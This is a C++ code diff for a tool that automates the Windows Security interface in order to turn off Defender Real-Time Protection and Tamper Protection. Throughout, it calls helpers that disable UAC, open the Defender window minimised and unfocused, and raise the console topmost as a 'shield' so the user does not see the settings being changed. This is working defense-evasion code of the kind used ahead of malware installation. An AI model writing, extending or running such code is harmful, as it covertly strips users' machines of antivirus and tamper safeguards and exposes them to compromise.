@@ -10,10 +10,20 @@
 
 using namespace std::chrono_literals;
 
-// Simple logging macros - cannot use common.h due to UIAutomation conflicts
+#define DEBUG_LOGGING_ENABLED 0
+
+#if DEBUG_LOGGING_ENABLED
+    #define DEBUG_LOG(msg) std::wcout << msg << L"\n"
+#else
+    #define DEBUG_LOG(msg) ((void)0)
+#endif
+
 #define INFO_LOG(msg) std::wcout << L"[*] " << msg << L"\n"
 #define ERROR_LOG(msg) std::wcout << L"[-] " << msg << L"\n"
-#define DEBUG_LOG(msg) // Disabled by default
+
+// ============================================================================
+// Constructor / Destructor
+// ============================================================================
 
 WindowsDefenderAutomation::WindowsDefenderAutomation() {
     CoInitializeEx(nullptr, COINIT_MULTITHREADED);
@@ -29,39 +39,70 @@ WindowsDefenderAutomation::~WindowsDefenderAutomation() {
     CoUninitialize();
 }
 
-// Cold boot detection: checks if this is first run after login
+// ============================================================================
+// Window Finder
+// ============================================================================
+
+struct FindWindowData {
+    HWND hWndFound;
+};
+
+BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
+    FindWindowData* data = (FindWindowData*)lParam;
+    wchar_t className[256] = { 0 };
+
+    if (GetClassNameW(hwnd, className, 256)) {
+        if (wcscmp(className, L"ApplicationFrameWindow") == 0 && IsWindowVisible(hwnd)) {
+            data->hWndFound = hwnd;
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+HWND WindowsDefenderAutomation::findSecurityWindow(int maxRetries) {
+    FindWindowData data = { 0 };
+
+    for (int i = 0; i < maxRetries; ++i) {
+        EnumWindows(EnumWindowsCallback, (LPARAM)&data);
+        if (data.hWndFound) {
+            return data.hWndFound;
+        }
+        std::this_thread::sleep_for(100ms);
+    }
+    return NULL;
+}
+
+// ============================================================================
+// Cold Boot Detection and Pre-Warming
+// ============================================================================
+
 bool WindowsDefenderAutomation::isColdBoot() {
     return !DefenderStealth::CheckVolatileWarmMarker();
 }
 
-// Pre-warm Defender on cold boot to stabilize UI Automation
 bool WindowsDefenderAutomation::preWarmDefender() {
     INFO_LOG(L"Cold boot detected - pre-warming Windows Defender");
     
-    // Open Defender without automation (just to load components)
+    // Console shield is already active from openDefenderSettings
     ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", 
-                  nullptr, nullptr, SW_SHOWNOACTIVATE);
+                  nullptr, nullptr, SW_SHOWMINNOACTIVE);
     
-    // Wait for window to appear (longer timeout for cold boot)
     std::this_thread::sleep_for(800ms);
     
-    HWND hwnd = DefenderStealth::FindSecurityWindowOnly(10);
+    HWND hwnd = findSecurityWindow(10);
     
     if (hwnd) {
         DEBUG_LOG(L"Pre-warm window found, waiting for full initialization");
-        
-        // Wait for window to be fully initialized
         std::this_thread::sleep_for(800ms);
         
-        // Bring to foreground (critical for cold boot)
         SetForegroundWindow(hwnd);
         std::this_thread::sleep_for(100ms);
         
-        // Close pre-warm window
         DEBUG_LOG(L"Closing pre-warm window");
         SendMessage(hwnd, WM_SYSCOMMAND, SC_CLOSE, 0);
         
-        // Verify window closed
+        // Wait for window to close
         bool closed = false;
         for (int i = 0; i < 30; i++) {
             if (!IsWindow(hwnd) || !IsWindowVisible(hwnd)) {
@@ -71,19 +112,12 @@ bool WindowsDefenderAutomation::preWarmDefender() {
             std::this_thread::sleep_for(100ms);
         }
         
-		if (!closed) {
-			DEBUG_LOG(L"Retry close with PostMessage");
-			PostMessage(hwnd, WM_CLOSE, 0, 0);
-
-			for (int i = 0; i < 10; i++) {
-				if (!IsWindow(hwnd) || !IsWindowVisible(hwnd)) {
-					break;
-				}
-				std::this_thread::sleep_for(100ms);
-			}
-		}
+        if (!closed) {
+            DEBUG_LOG(L"Retry close with PostMessage");
+            PostMessage(hwnd, WM_CLOSE, 0, 0);
+            std::this_thread::sleep_for(1000ms);
+        }
         
-        // Mark as warmed for this session
         DefenderStealth::SetVolatileWarmMarker();
         DEBUG_LOG(L"Pre-warm complete");
         return true;
@@ -93,24 +127,32 @@ bool WindowsDefenderAutomation::preWarmDefender() {
     return false;
 }
 
+// ============================================================================
+// Open Defender Settings
+// ============================================================================
+
 bool WindowsDefenderAutomation::openDefenderSettings() {
     DEBUG_LOG(L"Opening Windows Defender");
     
-    // Check if cold boot and pre-warm if needed
+    // Set console as shield FIRST - before anything else can flash on screen
+    DefenderStealth::SetConsoleTopmost();
+
     if (isColdBoot()) {
+        // Pre-warming now happens safely behind the console shield
         preWarmDefender();
         std::this_thread::sleep_for(800ms);
+        
+        // Re-apply topmost in case OS changed Z-order during pre-warm window close
+        DefenderStealth::SetConsoleTopmost();
     }
     
-    // Open window in background to avoid user interference
     ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", nullptr, nullptr, SW_SHOWMINNOACTIVE);
     
-    // Find and cloak window (ghost mode)
-    hwndSecurity = DefenderStealth::FindAndCloakSecurityWindow(10);
+    hwndSecurity = findSecurityWindow(10);
 
-    // Wait for UI to load (50 retries * 100ms = 5 sec for slow systems)
-    if (!hwndSecurity || !waitForUILoaded(50)) {
+    if (!hwndSecurity || !waitForUILoaded(50)) { 
         ERROR_LOG(L"Failed to load Defender UI (timeout on slow system)");
+        DefenderStealth::RestoreConsoleNormal();
         return false;
     }
     return true;
@@ -123,7 +165,6 @@ bool WindowsDefenderAutomation::waitForUILoaded(int maxRetries) {
             HRESULT hr = pAutomation->ElementFromHandle(hwndSecurity, &pRootElement);
             
             if (SUCCEEDED(hr)) {
-                // Check if element tree is populated (more than 10 elements = loaded)
                 if (countTotalElements() > 10) return true;
             }
         }
@@ -133,7 +174,10 @@ bool WindowsDefenderAutomation::waitForUILoaded(int maxRetries) {
     return false;
 }
 
-// Find first toggle switch (Real-Time Protection)
+// ============================================================================
+// UI Automation Helpers
+// ============================================================================
+
 IUIAutomationElement* WindowsDefenderAutomation::findFirstToggleSwitch() {
     IUIAutomationCondition* pCondition = nullptr;
     VARIANT var;
@@ -170,7 +214,6 @@ IUIAutomationElement* WindowsDefenderAutomation::findFirstToggleSwitch() {
     return nullptr;
 }
 
-// Find last toggle switch (Tamper Protection)
 IUIAutomationElement* WindowsDefenderAutomation::findLastToggleSwitch() {
     IUIAutomationCondition* pCondition = nullptr;
     VARIANT var;
@@ -226,9 +269,8 @@ int WindowsDefenderAutomation::countTotalElements() {
     return count;
 }
 
-// Wait for UI structure change (structural density detection)
 bool WindowsDefenderAutomation::waitForStructureChange(int baselineCount, bool expectIncrease, int timeoutSeconds) {
-    DEBUG_LOG(L"Waiting for UI update");
+    DEBUG_LOG(L"Waiting for UI structure change");
     int maxLoops = timeoutSeconds * 10;
     
     for (int i = 0; i < maxLoops; ++i) {
@@ -241,21 +283,34 @@ bool WindowsDefenderAutomation::waitForStructureChange(int baselineCount, bool e
             bool stable = expectIncrease ? (recheckCount > baselineCount) : (recheckCount < baselineCount);
             
             if (stable) {
-                DEBUG_LOG(L"UI update confirmed");
+                DEBUG_LOG(L"UI structure change confirmed");
                 return true;
             }
         }
         std::this_thread::sleep_for(100ms);
     }
-    DEBUG_LOG(L"UI update timeout");
+    DEBUG_LOG(L"UI structure change timeout");
     return false;
 }
 
+// ============================================================================
+// Close Security Window
+// ============================================================================
+
 void WindowsDefenderAutomation::closeSecurityWindow() {
-    if (hwndSecurity) SendMessage(hwndSecurity, WM_CLOSE, 0, 0);
+    if (hwndSecurity) {
+        SendMessage(hwndSecurity, WM_CLOSE, 0, 0);
+    }
+    
+    // Restore console to normal state and clear screen
+    DefenderStealth::RestoreConsoleNormal();
+    std::wcout << L"[*] Security window closed. Operation finished.\n";
 }
 
-// Real-Time Protection operations
+// ============================================================================
+// Real-Time Protection Operations
+// ============================================================================
+
 bool WindowsDefenderAutomation::toggleRealTimeProtection() {
     if (!DefenderStealth::BackupAndDisableUAC()) return false;
     
@@ -276,6 +331,13 @@ bool WindowsDefenderAutomation::toggleRealTimeProtection() {
         pButton->Release();
 
         result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
+        if (result) {
+            if (stateBefore == ToggleState_On) {
+                std::wcout << L"[+] Real-Time Protection disabled successfully\n";
+            } else {
+                std::wcout << L"[+] Real-Time Protection enabled successfully\n";
+            }
+        }
     } else {
         pButton->Release();
     }
@@ -307,8 +369,12 @@ bool WindowsDefenderAutomation::enableRealTimeProtection() {
             pToggle->Release();
             pButton->Release();
             result = waitForStructureChange(baseline, false);
+            if (result) {
+                std::wcout << L"[+] Real-Time Protection enabled successfully\n";
+            }
         } else {
             INFO_LOG(L"RTP already enabled");
+            std::wcout << L"[+] Real-Time Protection enabled successfully\n";
             pToggle->Release();
             pButton->Release();
         }
@@ -341,8 +407,12 @@ bool WindowsDefenderAutomation::disableRealTimeProtection() {
             pToggle->Release();
             pButton->Release();
             result = waitForStructureChange(baseline, true);
+            if (result) {
+                std::wcout << L"[+] Real-Time Protection disabled successfully\n";
+            }
         } else {
             INFO_LOG(L"RTP already disabled");
+            std::wcout << L"[+] Real-Time Protection disabled successfully\n";
             pToggle->Release();
             pButton->Release();
         }
@@ -374,7 +444,10 @@ bool WindowsDefenderAutomation::getRealTimeProtectionStatus() {
     return isEnabled;
 }
 
-// Tamper Protection operations
+// ============================================================================
+// Tamper Protection Operations
+// ============================================================================
+
 bool WindowsDefenderAutomation::toggleTamperProtection() {
     if (!DefenderStealth::BackupAndDisableUAC()) return false;
     
@@ -395,6 +468,13 @@ bool WindowsDefenderAutomation::toggleTamperProtection() {
         pButton->Release();
 
         result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
+        if (result) {
+            if (stateBefore == ToggleState_On) {
+                std::wcout << L"[+] Tamper Protection disabled successfully\n";
+            } else {
+                std::wcout << L"[+] Tamper Protection enabled successfully\n";
+            }
+        }
     } else {
         pButton->Release();
     }
@@ -426,8 +506,12 @@ bool WindowsDefenderAutomation::enableTamperProtection() {
             pToggle->Release();
             pButton->Release();
             result = waitForStructureChange(baseline, false);
+            if (result) {
+                std::wcout << L"[+] Tamper Protection enabled successfully\n";
+            }
         } else {
             INFO_LOG(L"Tamper Protection already enabled");
+            std::wcout << L"[+] Tamper Protection enabled successfully\n";
             pToggle->Release();
             pButton->Release();
         }
@@ -460,8 +544,12 @@ bool WindowsDefenderAutomation::disableTamperProtection() {
             pToggle->Release();
             pButton->Release();
             result = waitForStructureChange(baseline, true);
+            if (result) {
+                std::wcout << L"[+] Tamper Protection disabled successfully\n";
+            }
         } else {
             INFO_LOG(L"Tamper Protection already disabled");
+            std::wcout << L"[+] Tamper Protection disabled successfully\n";
             pToggle->Release();
             pButton->Release();
         }
